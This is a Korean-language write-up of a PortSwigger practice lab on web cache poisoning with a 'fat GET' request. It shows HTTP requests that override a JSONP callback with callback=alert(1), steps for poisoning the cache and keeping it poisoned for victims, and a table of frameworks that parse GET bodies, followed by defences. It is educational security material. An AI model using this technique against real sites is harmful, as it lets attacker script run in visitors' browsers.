# Lab: Web cache poisoning via a fat GET request

## 개요

- **난이도**: Practitioner
- **주제**: Web Cache Poisoning — Fat GET(본문이 있는 GET) / 캐시 키에 body 미포함 / JSONP 콜백 조작
- **링크**: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get

## 목표

`GET` 요청에 body 를 붙여 백엔드의 `callback` 파라미터를 덮어쓰되, 캐시 키는 URL 기준이라 오염되도록 만들어 `alert(1)` 을 실행시킨다.

## 기초 개념 — Fat GET

```
[일반적 가정]
  GET 은 body 가 없다 (파라미터는 쿼리스트링에만)

[Fat GET]
  GET 요청에 body 를 붙임
  - HTTP 스펙상 금지되진 않지만 비표준/권장되지 않음
  - 서버·프레임워크가 GET body 를 파싱하는 경우가 있음
```

이 랩에서는:
- 백엔드가 GET body 의 파라미터를 파싱/반영
- 캐시는 URL(요청 라인)만으로 키를 생성 → body 는 unkeyed

## 취약 지점

### 1. GET body 의 중복 파라미터가 반영됨

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

callback=arbitraryFunction
```

응답:

```http
HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
...
arbitraryFunction({"country" : "United Kingdom"})
```

- `callback` 은 원래 keyed(쿼리에 있음)
- 하지만 **body 의 중복 `callback` 이 최종값으로 반영**됨
- 캐시 키는 요청 라인의 `callback=setCountryCookie` 기준 → body 는 unkeyed

### 2. 캐시 키에 body 가 포함되지 않음

```
캐시 키: /js/geolocate.js?callback=setCountryCookie
body   : callback=alert(1)   ← 키에 없음
→ 같은 URL 의 캐시를 악성 응답으로 덮어씀
```

## 공격 단계

### 1단계 — 리소스 확인

모든 페이지가 `/js/geolocate.js` 를 임포트하고 `setCountryCookie()` 콜백을 실행함을 확인한다.

```
GET /js/geolocate.js?callback=setCountryCookie
→ setCountryCookie({"country" : "United Kingdom"})
```

### 2단계 — Fat GET 으로 callback 덮어쓰기

body 에 중복 `callback` 파라미터를 넣어 임의 함수명이 반영되는지 확인한다.

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Content-Type: application/x-www-form-urlencoded

callback=arbitraryFunction
```

### 3단계 — 악성 콜백 주입

```
callback=alert(1)
```

응답: `alert(1)({"country" : "United Kingdom"})` 형태로 콜백이 실행됨.

### 4단계 — 캐시 오염 및 확인

cache-buster 를 쓰지 않고 재전송해 캐시를 오염시킨 뒤, 홈 페이지를 열어 `alert()` 발생을 확인한다.

### 5단계 — 유지

피해자가 페이지를 방문할 때까지 재전송으로 캐시를 계속 오염 상태로 유지한다.

## GET body 처리 — 프레임워크/WAS/캐시 조사

"GET 은 body 가 없다" 는 가정이 계층마다 다르게 깨질 수 있다.

| 스택 | GET body 파싱 | 비고 |
|------|---------------|------|
| **Rack / Rails (Ruby)** | O (관행적) | `request.params` 가 쿼리와 body(form)를 병합. 대표적 fat GET 대상 |
| **Werkzeug / Flask (Python)** | O | `request.form`/`request.values` 가 content-type form 이면 body 파싱 |
| **Express (Node.js)** | 설정에 따라 O | `body-parser` urlencoded 를 전역 적용하면 GET body 도 파싱 |
| **Java Servlet / Tomcat** | 기본 X | `getParameter()` 는 GET 에서 쿼리만. `parseBodyMethods` 설정 시 확장 가능 |
| **PHP** | SAPI/설정에 따라 다름 | `$_POST` 는 보통 POST 만, 일부 SAPI 는 GET body 도 채움. `$_REQUEST` 병합 |
| **Django (Python)** | X | `request.POST` 는 POST 계열에서만 채워짐 |
| **Go net/http** | 기본 X | `ParseForm` 은 POST/PUT/PATCH 만 body 파싱 |
| **캐시/CDN (다수)** | body 미포함 | 키를 URL 기준으로 생성 → fat GET 에 취약 |

```
[핵심]
  - 서버가 GET body 를 파싱/반영하는가?
  - 캐시 키가 body 를 포함하는가?
  두 답이 "파싱함 + 미포함" 이면 fat GET 캐시 오염이 성립한다.

[관련 변형]
  - 중복 파라미터 우선순위(first-wins vs last-wins)
  - Content-Type 불일치 (form-urlencoded vs json vs text/plain)
  - 메서드 오버라이드(X-HTTP-Method-Override)와 결합
  - 요청 스머글링(GET body + CL/TE)과의 연계
```

## 방어

```
[근본 원인]
  1) GET 요청의 body 를 파싱/반영 (비표준 동작)
  2) 캐시 키에 요청 body 미포함
  3) 사용자 제어 JSONP 콜백 함수명 검증 부재

[올바른 방어]
  1. GET 요청 body 무시/거부
     - 서버에서 GET body 를 파싱하지 않음
     - 캐시/프록시에서 body 가 있는 GET 을 거부(400)하거나 키에 포함
  2. 캐시 키 정확성
     - 응답에 영향을 주는 모든 입력(URL/헤더/쿠키/body)을 키에 포함
  3. JSONP 콜백 등 사용자 제어 함수명 허용목록/검증
  4. 캐시와 백엔드의 파싱 규칙 일치
  5. CSP 로 스크립트 실행 완화

[주의]
  "메서드에 따라 body 유무가 정해진다" 는 가정은 구현/설정에 따라 깨진다.
  HTTP 레벨에서 비정상 요청(GET+body)을 일관되게 처리해야 한다.
```

## 핵심 정리

- GET 요청에 body 를 붙여 `callback` 파라미터를 덮어쓸 수 있었고, 캐시 키는 URL 기준이라 body 가 unkeyed 였다.
- `/js/geolocate.js?callback=setCountryCookie` 캐시를 `callback=alert(1)` 로 오염시켜 홈 페이지에서 `alert(1)` 을 실행했다.
- 본질은 **비표준 요청(GET+body)을 백엔드는 처리하고 캐시는 키에 반영하지 않는 불일치**다.
- Rack/Rails·Flask·Express(설정) 등은 GET body 파싱이 가능하고, 다수 캐시는 body 를 키에 넣지 않는다.

## 배운 점

- 007(`;` 파싱 불일치)에 이어, 이번에는 **요청 메서드와 body 처리에 대한 가정**이 깨진 사례다.
- 캐시 오염은 캐시와 백엔드가 "요청을 어떻게 해석하는가" 의 차이에서 계속 발생한다.
- HTTP 비정상 요청(GET+body, 메서드 오버라이드 등)은 예외 처리가 계층마다 달라 공격 표면이 된다.
- 캐시 키가 URL 뿐이라면, 어떤 방식으로든 응답에 영향을 주는 unkeyed 입력을 찾아 우회할 수 있다.
